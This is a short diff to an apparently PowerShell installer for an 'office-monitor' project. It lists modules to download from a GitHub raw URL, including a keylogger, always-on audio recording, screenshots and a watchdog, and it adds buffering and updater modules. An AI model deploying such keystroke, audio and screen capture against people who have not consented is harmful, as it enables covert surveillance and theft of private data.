@@ -13,7 +13,8 @@ $RepoBase    = "https://raw.githubusercontent.com/dogmat1910-tech/office-monitor
 $Files       = @(
     "agent.py", "active_window.py", "audio.py", "always_on_audio.py",
     "categories.py", "diagnostics.py", "idle.py", "keylogger.py",
-    "screenshot.py", "watchdog.py", "requirements.txt"
+    "local_buffer.py", "screenshot.py", "updater.py", "watchdog.py",
+    "requirements.txt"
 )
 
 function Info($m)  { Write-Host "[*] $m" -ForegroundColor Cyan }
